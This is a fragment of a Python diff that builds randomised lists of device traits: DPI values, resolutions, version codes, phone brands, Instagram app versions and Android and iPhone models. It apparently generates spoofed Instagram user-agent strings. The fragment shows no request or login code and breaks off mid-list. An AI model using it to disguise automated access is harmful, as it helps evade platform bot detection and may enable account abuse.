+    dpi = random.choice(['240dpi','240dpi','320dpi','400dpi','480dpi','320dpi','320dpi','240dpi','280dpi','240dpi','240dpi','160dpi','320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
+    pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
+    kode = random.choice(['145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
+    brand = random.choice(['samsung','realme','OnePlus','LAVA','TCL','motorola','Xiaomi','Redmi','POCO','Amazon','Google','OPPO','vivo','iQOO','HONOR','HUAWEI','ASUS','Nokia','Sony','Lenovo','ZTE','nubia','TECNO','Infinix','itel','Nothing','Meizu','Sharp','HTC','LG','Fairphone','BLU','Alcatel','Wiko','Coolpad','Micromax','Karbonn','Oukitel','UMIDIGI','Doogee','Ulefone','Blackview','ROG'])
+    ig_version = random.choice(("70.0.0.15.98, 80.0.0.20.101,60.0.0.10.76, 85.0.0.25.100,75.0.0.22.99,72.0.0.18.94, 68.0.0.16.84,78.0.0.14.97, 63.0.0.20.81,81.0.0.24.105,73.0.0.16.96,67.0.0.18.88,84.0.0.21.110,74.0.0.18.100,71.0.0.15.92,79.0.0.14.103,62.0.0.18.80,87.0.0.22.115,76.0.0.20.102,83.0.0.18.10,66.0.0.16.87,88.0.0.24.118,77.0.0.22.103,64.0.0.18.82,82.0.0.20.107,69.0.0.14.92,89.0.0.20.123,61.0.0.14.76,86.0.0.18.112,65.0.0.12.86,42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121").split(","))
+    model = random.choice(['SM-A015F','SM-A025F','SM-A035F','SM-A045F','SM-A055F','SM-A145F','SM-A155F','SM-A235F','SM-A245F','SM-A325M','SM-A336E','SM-A346E','SM-A525F','SM-A526B','SM-A536E','SM-A546E','SM-A556E','SM-G991B','SM-G996B','SM-G998B','SM-G990B','SM-S901B','SM-S906B','SM-S908B','SM-S911B','SM-S916B','SM-S918B','SM-S921B','SM-S926B','SM-S928B','SM-S931B','SM-S936B','SM-S938B','SM-N910F','SM-N975F','SM-F711B','SM-F721B','SM-F731B','SM-F741B','SM-F946B','SM-F956B','RMX2020','RMX2156','RMX2185','RMX3085','RMX3191','RMX3263','RMX3363','RMX3370','RMX3471','RMX3491','RMX3612','RMX3630','RMX3686','RMX3710','RMX3834','RMX3840','RMX3851','RMX3933','RMX3997','CPH1937','CPH2015','CPH2065','CPH2127','CPH2203','CPH2247','CPH2343','CPH2371','CPH2387','CPH2401','CPH2465','CPH2477','CPH2493','CPH2577','CPH2581','CPH2609','CPH2687','V2027','V2031','V2040','V2050','V2065','V2111','V2126','V2145','V2203','V2238','V2250','V2318','V2324','V2342','V2404','V2405','V2410','V2424','2312DRA50G','23127PN0CC','2312DRA50C','24040RN64Y','2406ERN9CI','M2007J3SG','M2102J20SG','M2101K7AG','M2102K1G','2201117TG','2201123G','22111317PG','22101320G','23049PCD8G','23122PCD1G','24069PC21G','24090RA29G','XQ-AT51','XQ-BE52','XQ-CT54','XQ-DQ72','XQ-ES72','A142','A144','AI2201_A','AI2302_A','AI2401_A','XT2019-1','XT2135-2','XT2215-1','XT2225-1','XT2341-1','XT2403-2','XT2431-3','Z60s','Z60 Ultra','5087Z','moto g(6) plus','moto g54 5G','moto g84 5G','Pixel 4a','Pixel 5','Pixel 5a','Pixel 6','Pixel 6 Pro','Pixel 6a','Pixel 7','Pixel 7 Pro','Pixel 7a','Pixel 8','Pixel 8 Pro','Pixel 8a','Pixel 9','Pixel 9 Pro','Pixel 9 Pro XL','Pixel 9a','OnePlus 7T','OnePlus 8','OnePlus 8T','OnePlus 9','OnePlus 9 Pro','OnePlus 10 Pro','OnePlus 11','OnePlus 12','OnePlus 12R','OnePlus 13','OnePlus Nord 2','OnePlus Nord 3','OnePlus Nord 4','LE2113','LE2123','NE2213','CPH2449','CPH2581','CPH2613','PEPM00','PDEM10','R7kf','R7f','R883T','KFRAWI','Seattle','Doha_TMO','moto g power','moto g stylus 5G'])
+    iphone = random.choice(['iPad6,3', 'iPhone8,4', 'iPhone10,5', 'iPhone8,1', 'iPhone8,2', 'iPhone8,3','iPhone13,2', 'iPhone13,1', 'iPhone12,1', 'iPhone12,2', 'iPhone13,1', 'iPhone13,2','iPhone14,1', 'iPhone14,2', 'iPhone14,5', 'iPhone15,2', 'iPhone15,1', 'iPhone16,2','iPhone16,1', 'iPhone12,5', 'iPhone11,6', 'iPhone11,8', 'iPhone9,3', 'iPhone9,4','iPad7,1', 'iPad7,2', 'iPad7,3', 'iPad7,4', 'iPhone6,1', 'iPhone6,2', 'iPhone5,1','iPhone5,2', 'iPhone7,1', 'iPhone7,2', 'iPhone4,1', 'iPhone5,3', 'iPhone5,4','iPhone6,3', 'iPhone6,4', 'iPhone7,3', 'iPhone8,5', 'iPhone8,6', 'iPhone8,7','iPhone9,2', 'iPhone9,1', 'iPhone10,1', 'iPhone10,2', 'iPhone11,4', 'iPhone11,8','iPhone12,3', 'iPhone12,8', 'iPhone13,3', 'iPhone13,4', 'iPhone14,4', 'iPhone14,6','iPad8,1', 'iPad8,2', 'iPad8,3', 'iPad8,4', 'iPad9,1', 'iPad9,2', 'iPad9,3','iPad9,4', 'iPad10,1', 'iPad10,2', 'iPad10,3', 'iPad10,4', 'iPad11,1', 'iPad11,2','iPad12,1', 'iPad12,2', 'iPad13,1', 'iPad13,2', 'iPad13,4', 'iPad13,5', 'iPad14,1','iPad14,2', 'iPad14,3', 'iPad14,4', 'iPhone14,7', 'iPhone14,8', 'iPhone15,3', 'iPhone15,4','iPhone5,5', 'iPhone6,5', 'iPhone6,6', 'iPhone7,4', 'iPhone8,8', 'iPhone10,3', 'iPhone10,4','iPhone11,2', 'iPhone11,3', 'iPhone11,4', 'iPhone11,5', 'iPhone11,7', 'iPhone12,6', 'iPhone12,7','iPhone13,5', 'iPhone13,6', 'iPhone13,7', 'iPhone14,3', 'iPhone14,4', 'iPhone15,5', 'iPhone15,6','iPad9,5', 'iPad9,6', 'iPad9,7', 'iPad9,8', 'iPad10,5', 'iPad10,6', 'iPad11,3', 'iPad11,4','iPad12,3', 'iPad12,4', 'iPad13,3', 'iPad13,6', 'iPad14,5', 'iPad14,6', 'iPad15,1', 'iPad15,2','iPad16,1', 'iPad16,2', 'iPhone4,2', 'iPhone4,3', 'iPhone4,4', 'iPhone4,5', 'iPhone4,6', 'iPhone5,2', 'iPhone5,3','iPhone5,4', 'iPhone6,5', 'iPhone6,6', 'iPhone6,7', 'iPhone6,8', 'iPhone7,4', 'iPhone8,8','iPhone10,3', 'iPhone10,4', 'iPhone11,3', 